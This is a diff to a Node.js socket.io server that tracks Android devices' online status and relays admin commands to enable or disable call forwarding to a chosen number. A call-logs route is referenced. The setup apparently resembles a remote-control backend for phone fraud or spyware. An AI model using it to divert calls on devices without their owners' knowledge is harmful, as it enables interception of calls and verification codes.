@@ -367,36 +367,42 @@ app.get("/call-logs", async (req, res) => {
 
 
 
+const onlineUsers = {};  // Track all online states
+
 io.on("connection", (socket) => {
   console.log("🟢 Device/Admin connected:", socket.id);
+
+  // Send current status immediately to admin/web/dashboard
+  socket.emit("bulk_status_update", onlineUsers);
 
   // Device join
   socket.on("join-user", (userId) => {
     console.log(`📌 Device joined: user-${userId}`);
-    socket.userId = userId;     // store reference for disconnect
+    socket.userId = userId;
     socket.join(`user-${userId}`);
   });
 
-  // Admin controlling app
+  // Admin triggers forwarding
   socket.on("forwarding_control", ({ userId, action, number }) => {
     console.log("📤 Forwarding command sent:", userId, action);
 
     io.to(`user-${userId}`).emit("call_forward_command", {
-      action,   // enable / disable
-      number    // target number
+      action,
+      number
     });
   });
 
-  // Android reports back success/failure
+  // Android acknowledgment
   socket.on("forwarding_status_from_app", (data) => {
     console.log("📩 Status received:", data);
-
     io.emit("forwarding_status", data);
   });
 
   // Android sends online/offline
   socket.on("user_status", (data) => {
     console.log("STATUS:", data);
+
+    onlineUsers[data.userId] = data.status === "online"; // store ✔
 
     io.emit("user_status_update", {
       userId: data.userId,
@@ -408,14 +414,16 @@ io.on("connection", (socket) => {
     console.log("🔴 Disconnected:", socket.id);
 
     if (socket.userId) {
+      onlineUsers[socket.userId] = false; // store offline ✔
+
       io.emit("user_status_update", {
         userId: socket.userId,
         status: "offline"
       });
     }
   });
-
 });
+
 
 
 
